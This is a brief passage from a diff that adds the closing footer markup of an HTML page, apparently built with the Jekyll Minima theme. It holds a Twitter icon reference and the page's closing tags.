+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
